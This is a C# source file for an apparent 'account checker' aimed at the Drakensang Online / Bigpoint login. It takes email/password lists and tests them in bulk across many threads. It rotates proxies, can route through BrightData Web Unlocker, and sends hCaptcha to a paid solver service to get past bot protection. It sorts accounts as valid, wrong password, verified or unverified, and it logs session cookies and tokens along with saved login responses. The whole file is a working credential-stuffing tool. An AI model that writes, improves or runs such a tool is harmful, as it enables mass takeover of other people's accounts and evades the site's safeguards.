using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using HtmlAgilityPack;
using CheckerDSO.Models;
using System.Linq;
using System.Text.RegularExpressions;

namespace CheckerDSO.Services
{
    public class CheckerService
    {
        private readonly List<ProxyEntry> _proxies;
        private int _proxyIndex = 0;
        private readonly object _proxyLock = new object();

        // Thread-local state for per-account login results
        [ThreadStatic] private static string _lastAccountUrl;
        [ThreadStatic] private static string _lastLoginHtml;

        // 2captcha veya CapSolver API key (boş → Captcha status)
        public string TwoCaptchaApiKey { get; set; } = "";

        // BrightData Web Unlocker credentials
        // Username format: brd-customer-XXXX-zone-YYYY
        // Password: zone şifresi
        public string BrightDataUsername { get; set; } = "";
        public string BrightDataPassword { get; set; } = "";

        // Verbose debug log event — UI buna subscribe ola bilər
        public event Action<string> OnDebugLog;
        private void Log(string msg) => OnDebugLog?.Invoke($"[{DateTime.Now:HH:mm:ss}] {msg}");

        private bool UseBrightData =>
            !string.IsNullOrWhiteSpace(BrightDataUsername) &&
            !string.IsNullOrWhiteSpace(BrightDataPassword);

        public CheckerService(List<ProxyEntry> proxies)
        {
            _proxies = proxies ?? new List<ProxyEntry>();
        }

        private ProxyEntry GetNextProxy()
        {
            if (_proxies == null || _proxies.Count == 0) return null;
            lock (_proxyLock)
            {
                var proxy = _proxies[_proxyIndex];
                _proxyIndex = (_proxyIndex + 1) % _proxies.Count;
                return proxy;
            }
        }

        public async Task CheckAccountAsync(AccountEntry account, CancellationToken token)
        {
            if (account.Status != AccountStatus.Pending) return;
            account.Status = AccountStatus.Checking;
            account.Notes = "Initializing...";

            var proxy = GetNextProxy();

            try
            {
                // BrightData varsa onu kullan (captcha otomatik çözülür)
                // Yoksa normal proxy kullan
                HttpClient client = UseBrightData
                    ? HttpService.CreateClientWithBrightData(BrightDataUsername, BrightDataPassword)
                    : HttpService.CreateClient(proxy);

                using (client)
                {
                    // ─── ADIM 1: Login sayfasını al ───
                    account.Notes = UseBrightData ? "Fetching via BrightData..." : "Fetching login page...";
                    var getResp = await client.GetAsync("https://www.drakensang.com/en/login", token);
                    var getHtml = await getResp.Content.ReadAsStringAsync(token);

                    // ─── ADIM 2: Session token ve POST URL'yi çıkar ───
                    string postUrl = ExtractPostUrl(getHtml);

                    // ─── ADIM 3: BrightData ile captcha otomatik, yoksa solver ───
                    LoginResult result;

                    if (UseBrightData)
                    {
                        // BrightData Web Unlocker → captcha'yı proxy seviyesinde halleder
                        account.Notes = "Logging in via BrightData...";
                        Log($"{account.Email} — BrightData login attempt, postUrl={postUrl}");
                        result = await AttemptLogin(client, postUrl, account.Email, account.Password, "", token);
                        Log($"{account.Email} — BrightData result: {result}");
                    }
                    else
                    {
                        // Önce captchasız dene
                        account.Notes = "Trying without captcha...";
                        Log($"{account.Email} — No-captcha attempt, postUrl={postUrl}");
                        result = await AttemptLogin(client, postUrl, account.Email, account.Password, "", token);
                        Log($"{account.Email} — No-captcha result: {result}");

                        if (result == LoginResult.CaptchaRequired)
                        {
                            if (string.IsNullOrWhiteSpace(TwoCaptchaApiKey))
                            {
                                account.Status = AccountStatus.Captcha;
                                account.Notes = "Captcha required (set API key)";
                                return;
                            }

                            account.Notes = "Solving captcha...";
                            Log($"{account.Email} — Sending to captcha solver (key={TwoCaptchaApiKey.Substring(0, Math.Min(8, TwoCaptchaApiKey.Length))}...)...");
                            var solver = new CaptchaSolverService(TwoCaptchaApiKey);
                            solver.OnDebugLog += Log;  // solver loglarını ana loga yönləndir
                            string hToken = await solver.SolveHCaptchaAsync(token);

                            if (hToken == null)
                            {
                                account.Status = AccountStatus.Captcha;
                                account.Notes = "Captcha solve failed (null token)";
                                Log($"{account.Email} — 2captcha returned null token!");
                                return;
                            }

                            Log($"{account.Email} — Got captcha token (len={hToken.Length}): {hToken.Substring(0, Math.Min(40, hToken.Length))}...");

                            account.Notes = "Refreshing session...";
                            var freshGetResp = await client.GetAsync("https://www.drakensang.com/en/login", token);
                            var freshHtml = await freshGetResp.Content.ReadAsStringAsync(token);
                            string freshPostUrl = ExtractPostUrl(freshHtml);
                            Log($"{account.Email} — Fresh postUrl={freshPostUrl}");

                            result = await AttemptLogin(client, freshPostUrl, account.Email, account.Password, hToken, token);
                            Log($"{account.Email} — After captcha result: {result}");
                        }
                    }

                    // ─── ADIM 4: Sonucu işle ───
                    switch (result)
                    {
                        case LoginResult.WrongPassword:
                            account.Status = AccountStatus.WrongPass;
                            account.Notes = "Wrong Password";
                            return;

                        case LoginResult.CaptchaRequired:
                            account.Status = AccountStatus.Captcha;
                            account.Notes = UseBrightData ? "BrightData captcha failed" : "Captcha not solved";
                            return;

                        case LoginResult.BotBlocked:
                            account.Status = AccountStatus.Captcha;
                            account.Notes = "Cloudflare / Bot blocked";
                            return;

                        case LoginResult.Success when !string.IsNullOrEmpty(_lastAccountUrl):
                            account.Notes = "Checking email status...";
                            await CheckEmailVerificationAsync(client, _lastAccountUrl, account, token);
                            return;

                        default:
                            account.Status = AccountStatus.Error;
                            string shortUrl = postUrl?.Length > 60 ? postUrl.Substring(0, 60) : postUrl;
                            account.Notes = $"Unknown response (POST→ {shortUrl})";
                            return;
                    }
                }
            }
            catch (TaskCanceledException)
            {
                account.Status = AccountStatus.Pending;
                account.Notes = "Cancelled";
            }
            catch (HttpRequestException ex)
            {
                account.Status = AccountStatus.Error;
                account.Notes = $"Http Error: {ex.Message}";
            }
            catch (Exception ex)
            {
                account.Status = AccountStatus.Error;
                account.Notes = $"Error: {ex.Message}";
            }
            finally
            {
                await Task.Delay(new Random().Next(500, 1500), CancellationToken.None);
            }
        }


        private enum LoginResult { Success, WrongPassword, CaptchaRequired, BotBlocked, Unknown }

        private async Task<LoginResult> AttemptLogin(
            HttpClient client, string postUrl,
            string email, string password,
            string hCaptchaToken,
            CancellationToken token)
        {
            _lastAccountUrl = null;

            if (string.IsNullOrEmpty(postUrl))
            {
                Log($"{email} — postUrl is null/empty! Cannot login.");
                return LoginResult.Unknown;
            }

            var payload = new List<KeyValuePair<string, string>>
            {
                new KeyValuePair<string, string>("username", email),
                new KeyValuePair<string, string>("password", password),
            };

            if (!string.IsNullOrEmpty(hCaptchaToken))
            {
                payload.Add(new KeyValuePair<string, string>("h-captcha-response", hCaptchaToken));
                payload.Add(new KeyValuePair<string, string>("g-recaptcha-response", hCaptchaToken));
                Log($"{email} — Payload includes captcha token.");
            }

            // Removed sec-fetch-site global header override to allow HttpClient to manage it natively.

            var request = new HttpRequestMessage(HttpMethod.Post, postUrl)
            {
                Content = new FormUrlEncodedContent(payload)
            };

            // Pre-flight to get SSO cookies (bgc_sudc, etc.) that might be required
            try
            {
                await client.GetAsync("https://sas.bpsecure.com/", token);
                await client.GetAsync("https://sharedservices.bpsecure.com/bgc/js/bgc-2.0.0.min.js", token);
            }
            catch { }

            request.Headers.Referrer = new Uri("https://www.drakensang.com/en/login");
            request.Headers.TryAddWithoutValidation("Origin", "https://www.drakensang.com");

            HttpResponseMessage loginResponse;
            string loginContent;
            try
            {
                loginResponse = await client.SendAsync(request, token);
                loginContent = await loginResponse.Content.ReadAsStringAsync(token);
            }
            catch (Exception ex)
            {
                Log($"{email} — POST exception: {ex.Message}");
                return LoginResult.Unknown;
            }

            string finalUrl = loginResponse.RequestMessage?.RequestUri?.ToString() ?? "";
            int statusCode = (int)loginResponse.StatusCode;

            // loginContent-i saxla (drakensang.com response) — email yoxlaması üçün
            _lastLoginHtml = loginContent;

            // DSO response HTML-i hər account üçün ayrıca saxla (müqayisə üçün)
            try {
                string safeEm = string.Concat(email.Split(System.IO.Path.GetInvalidFileNameChars()));
                string dsoPath = System.IO.Path.Combine(
                    AppDomain.CurrentDomain.BaseDirectory, $"dso_{safeEm}.html");
                System.IO.File.WriteAllText(dsoPath, loginContent);
            } catch { }

            // Dump cookies for debugging
            try
            {
                var handler = typeof(HttpMessageInvoker).GetField("_handler", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance)?.GetValue(client) as HttpClientHandler;
                if (handler != null)
                {
                    var cookies = handler.CookieContainer.GetAllCookies();
                    Log($"{email} — Cookies after login: {string.Join("; ", cookies.Cast<System.Net.Cookie>().Select(c => $"{c.Name}={c.Value} ({c.Domain})"))}");
                }
            }
            catch { }

            // ── LOG: İlk 600 char cavabı gör ──────────────────────────────────────
            string snippet = loginContent.Length > 600
                ? loginContent.Substring(0, 600).Replace("\n", " ").Replace("\r", "")
                : loginContent.Replace("\n", " ").Replace("\r", "");
            Log($"{email} — HTTP {statusCode} | FinalUrl={finalUrl}");
            Log($"{email} — Response snippet: {snippet}");
            // ──────────────────────────────────────────────────────────────────────

            string finalUrlLower = finalUrl.ToLower();
            string contentLower  = loginContent.ToLower();

            if (contentLower.Contains("prove you are human") ||
                contentLower.Contains("cloudflare-nginx") ||
                contentLower.Contains("cf-browser-verification"))
            {
                Log($"{email} — BotBlocked detected.");
                return LoginResult.BotBlocked;
            }

            // ── SUCCESS: redirect to accountcenter.bpsecure.com ──────────────
            if (finalUrlLower.Contains("accountcenter.bpsecure.com") && finalUrlLower.Contains("token="))
            {
                _lastAccountUrl = loginResponse.RequestMessage?.RequestUri?.ToString();
                Log($"{email} — SUCCESS (accountcenter redirect): {_lastAccountUrl}");
                return LoginResult.Success;
            }

            // ── SUCCESS: drakensang.com/en?authUser=XXX&token=TOKEN ────────────
            // Login uğurlu olduqda sas.bpsecure.com → drakensang.com/en?authUser=XXX&token=TOKEN
            // Xəta halında URL-də error=bgc.error... olur — yuxarıdakı URL checks-də tutulur.
            // Bu nöqtəyə gəlibsə + drakensang URL + token var = login uğurludur.
            if (finalUrlLower.Contains("drakensang.com") && finalUrlLower.Contains("token=") &&
                finalUrlLower.Contains("authuser="))
            {
                // authUser və token-i URL-dən çıxar
                var auMatch  = Regex.Match(finalUrl, @"[?&]authUser=(\d+)", RegexOptions.IgnoreCase);
                var tokMatch = Regex.Match(finalUrl, @"[?&]token=([A-Za-z0-9_\-\.%]+)", RegexOptions.IgnoreCase);

                if (auMatch.Success && tokMatch.Success)
                {
                    string authUser  = auMatch.Groups[1].Value;
                    string rawToken  = Uri.UnescapeDataString(tokMatch.Groups[1].Value);
                    string encToken  = Uri.EscapeDataString(rawToken);
                    _lastAccountUrl  =
                        $"https://accountcenter.bpsecure.com/bgc/manageaccount?authUser={authUser}&token={encToken}";
                    Log($"{email} — SUCCESS (drakensang redirect). authUser={authUser}, tokenLen={rawToken.Length}");
                    return LoginResult.Success;
                }
            }

            // ── JSON response ─────────────────────────────────────────────────
            string trimmed = loginContent.TrimStart();
            if (trimmed.StartsWith("{") || trimmed.StartsWith("["))
            {
                if (contentLower.Contains("captcha"))
                {
                    Log($"{email} — JSON: captcha error detected.");
                    return LoginResult.CaptchaRequired;
                }
                if (contentLower.Contains("invalidcredentials") ||
                    contentLower.Contains("\"success\":false") ||
                    contentLower.Contains("wrong password") ||
                    contentLower.Contains("invalid password"))
                {
                    Log($"{email} — JSON: wrong credentials.");
                    return LoginResult.WrongPassword;
                }
                string acUrl = FindAccountCenterUrl(loginContent);
                if (acUrl != null)
                {
                    _lastAccountUrl = acUrl;
                    Log($"{email} — JSON: found accountcenter URL.");
                    return LoginResult.Success;
                }
                Log($"{email} — JSON: unrecognized response.");
                return LoginResult.Unknown;
            }

            // ── URL-based checks ──────────────────────────────────────────────
            if (finalUrlLower.Contains("error=bgc.error.captcha_incorrect") ||
                finalUrlLower.Contains("captcha.notsolved") ||
                contentLower.Contains("captcha.notsolved"))
            {
                Log($"{email} — Captcha incorrect/not solved (URL or content).");
                return LoginResult.CaptchaRequired;
            }

            if (finalUrlLower.Contains("invalidcredentials") ||
                finalUrlLower.Contains("error=bgc.error"))
            {
                Log($"{email} — WrongPassword (URL check).");
                return LoginResult.WrongPassword;
            }

            // ── HTML error flash ──────────────────────────────────────────────
            var loginDoc = new HtmlDocument();
            loginDoc.LoadHtml(loginContent);

            var errorFlash = loginDoc.DocumentNode.SelectSingleNode("//div[contains(@class,'bgcdw_errors_flash')]")
                          ?? loginDoc.DocumentNode.SelectSingleNode("//*[contains(@class,'errors_flash')]");
            if (errorFlash != null)
            {
                string errHtml = errorFlash.InnerHtml.ToLower();
                bool hasContent = errorFlash.SelectNodes(".//li")?.Count > 0 ||
                                  errorFlash.InnerText.Trim().Length > 3;
                if (hasContent)
                {
                    Log($"{email} — ErrorFlash text: {errorFlash.InnerText.Trim()}");
                    if (errHtml.Contains("captcha")) return LoginResult.CaptchaRequired;
                    if (errHtml.Contains("invalidcredentials") || errHtml.Contains("wrong") ||
                        errHtml.Contains("no account"))
                        return LoginResult.WrongPassword;
                }
            }

            // ── HTML: accountcenter link ──────────────────────────────────────
            string foundUrl = FindAccountCenterUrl(loginContent);
            if (foundUrl != null)
            {
                _lastAccountUrl = foundUrl;
                Log($"{email} — SUCCESS (found accountcenter URL in HTML).");
                return LoginResult.Success;
            }

            // ── Fallback ──────────────────────────────────────────────────────
            // Token varsa amma cavab tanınmırsa → CaptchaRequired kimi qeyd et
            // (server token-i qəbul etməyib, yenidən cəhd lazımdır)
            if (!string.IsNullOrEmpty(hCaptchaToken))
            {
                Log($"{email} — Had captcha token but response unrecognized → Unknown.");
                return LoginResult.Unknown;  // WrongPass deyil, cavab sadəcə anlaşılmadı
            }

            Log($"{email} — No captcha token and no match → CaptchaRequired.");
            return LoginResult.CaptchaRequired;
        }

        private static string FindAccountCenterUrl(string html)
        {
            var m = Regex.Match(html,
                @"https://accountcenter\.bpsecure\.com/[^""'\s<>]*[?&]token=[a-zA-Z0-9_\-\.%]+",
                RegexOptions.IgnoreCase);
            if (m.Success) return WebUtility.HtmlDecode(m.Value);

            m = Regex.Match(html,
                @"href=""(https://accountcenter\.bpsecure\.com/[^""]*[?&]token=[^""]+)""",
                RegexOptions.IgnoreCase);
            if (m.Success) return WebUtility.HtmlDecode(m.Groups[1].Value);

            m = Regex.Match(html,
                @"window\.location[^=]*=\s*[""'](https://accountcenter\.bpsecure\.com/[^""']*[?&]token=[^""']+)[""']",
                RegexOptions.IgnoreCase);
            if (m.Success) return m.Groups[1].Value;

            return null;
        }

        private static string ExtractPostUrl(string html)
        {
            var stateMatch = Regex.Match(html,
                @"state=%7B%22authUser%22%3A%22481%22%2C%22token%22%3A%22([A-Za-z0-9_\-\.%]+)%22%7D",
                RegexOptions.IgnoreCase);
            if (stateMatch.Success)
            {
                string t = Uri.UnescapeDataString(stateMatch.Groups[1].Value);
                return $"https://sas.bpsecure.com/Sas/Authentication/Bigpoint?authUser=481&token={Uri.EscapeDataString(t)}";
            }

            var m = Regex.Match(html,
                @"action=[""'](https://sas\.bpsecure\.com/[^""']*)[""']",
                RegexOptions.IgnoreCase);
            if (m.Success) return WebUtility.HtmlDecode(m.Groups[1].Value);

            m = Regex.Match(html,
                @"https://sas\.bpsecure\.com/Sas/Authentication/Bigpoint[^""'\s<>]*",
                RegexOptions.IgnoreCase);
            if (m.Success) return WebUtility.HtmlDecode(m.Value);

            return "https://sas.bpsecure.com/Sas/Authentication/Bigpoint?authUser=481";
        }

        private async Task CheckEmailVerificationAsync(
            HttpClient client, string accountUrl, AccountEntry account, CancellationToken token)
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;

            // ════════════════════════════════════════════════════════════════════
            // ƏSAS METOD: BGC web-form login → SAS redirect-ə görə status müəyyən et
            // SAS unverified hesabı → accountcenter.bpsecure.com-a yönləndirir
            // SAS verified hesabı   → drakensang.com-da saxlayır
            // ════════════════════════════════════════════════════════════════════
            try
            {
                // 1. BGC login sayfasından fresh CSRF token götür
                var loginPageResp = await client.GetAsync("https://www.drakensang.com/en/account", token);
                string loginPageHtml = await loginPageResp.Content.ReadAsStringAsync(token);

                // Form action: <form action="https://sas.bpsecure.com/Sas/Authentication/Bigpoint?authUser=481&amp;token=TOKEN">
                var sasTokenMatch = Regex.Match(loginPageHtml,
                    @"action=""(https://sas\.bpsecure\.com/Sas/Authentication/Bigpoint\?[^""]+)""",
                    RegexOptions.IgnoreCase);

                if (sasTokenMatch.Success)
                {
                    string webLoginUrl = WebUtility.HtmlDecode(sasTokenMatch.Groups[1].Value);
                    Log($"{account.Email} — Web-form SAS URL: {webLoginUrl.Substring(0, Math.Min(80, webLoginUrl.Length))}...");

                    // 2. Credentials ilə SAS-a POST et
                    var webLoginData = new FormUrlEncodedContent(new Dictionary<string, string>
                    {
                        ["username"] = account.Email,
                        ["password"] = account.Password,
                    });
                    var webSasResp = await client.PostAsync(webLoginUrl, webLoginData, token);
                    await webSasResp.Content.ReadAsStringAsync(token); // body tüket
                    string webFinal = webSasResp.RequestMessage?.RequestUri?.ToString() ?? "";
                    Log($"{account.Email} — Web login final: {webFinal.Substring(0, Math.Min(100, webFinal.Length))}");

                    // ★ ƏSAS DETEKSIYA ★
                    // SAS unverified hesabları accountcenter-ə yönləndirir (email təsdiq üçün)
                    // SAS verified hesabları drakensang.com-da saxlayır
                    if (webFinal.Contains("accountcenter.bpsecure.com"))
                    {
                        account.Status = AccountStatus.Unverified;
                        account.Notes  = "Email Unverified";
                        Log($"{account.Email} — ★ UNVERIFIED ★ (SAS→accountcenter)");
                        return;
                    }

                    // Drakensang.com-da qaldı → Verified
                    account.Status = AccountStatus.Verified;
                    account.Notes  = "Email Verified";
                    Log($"{account.Email} — VERIFIED (SAS kept on drakensang).");
                    return;
                }
                else
                {
                    Log($"{account.Email} — BGC form token not found. Falling back to accountcenter check.");
                }
            }
            catch (Exception ex)
            {
                Log($"{account.Email} — Web-form login error: {ex.Message}. Falling back.");
            }

            // ════════════════════════════════════════════════════════════════════
            // FALLBACK: Köhnə accountcenter HTML yoxlaması
            // ════════════════════════════════════════════════════════════════════
            if (string.IsNullOrEmpty(accountUrl) || !accountUrl.Contains("accountcenter.bpsecure.com"))
            {
                account.Status = AccountStatus.Verified;
                account.Notes  = "Email Verified (fallback)";
                return;
            }

            // bpsecure.com cookie-lərini məcburi göndər
            string allBpCookies = "";
            try
            {
                var hf = typeof(HttpMessageInvoker).GetField("_handler",
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
                var h = hf?.GetValue(client) as HttpClientHandler;
                if (h != null)
                {
                    var bpC = h.CookieContainer.GetAllCookies().Cast<System.Net.Cookie>()
                        .Where(c => c.Domain.EndsWith("bpsecure.com", StringComparison.OrdinalIgnoreCase));
                    allBpCookies = string.Join("; ", bpC.Select(c => $"{c.Name}={c.Value}"));
                }
            }
            catch { }

            // accountcenter sayfalarını çək
            string combinedHtml = "";
            var auM  = Regex.Match(accountUrl, @"[?&]authUser=(\d+)", RegexOptions.IgnoreCase);
            var tokM = Regex.Match(accountUrl, @"[?&]token=([A-Za-z0-9_\-\.%]+)", RegexOptions.IgnoreCase);
            string au  = auM.Success  ? auM.Groups[1].Value : "291";
            string tok = tokM.Success ? tokM.Groups[1].Value : "";

            string combinedLower = combinedHtml.ToLower();
            bool isUnverified =
                combinedLower.Contains("bgc_sudc_initialemail_form") ||
                combinedLower.Contains("confirm e-mail")             ||
                combinedLower.Contains("resend confirmation")        ||
                combinedLower.Contains("not yet verified");

            account.Status = isUnverified ? AccountStatus.Unverified : AccountStatus.Verified;
            account.Notes  = isUnverified ? "Email Unverified" : "Email Verified";
            Log($"{account.Email} — Fallback result: {account.Status}");
        }




        public async Task StartCheckingAsync(
            IEnumerable<AccountEntry> accounts, int maxThreads,
            IProgress<int> progress, CancellationToken token)
        {
            var semaphore = new SemaphoreSlim(maxThreads);
            var tasks = new List<Task>();

            foreach (var account in accounts.Where(a => a.Status == AccountStatus.Pending))
            {
                token.ThrowIfCancellationRequested();
                await semaphore.WaitAsync(token);

                var t = Task.Run(async () =>
                {
                    try { await CheckAccountAsync(account, token); }
                    finally { semaphore.Release(); progress?.Report(1); }
                }, token);

                tasks.Add(t);
            }

            await Task.WhenAll(tasks);
        }
    }
}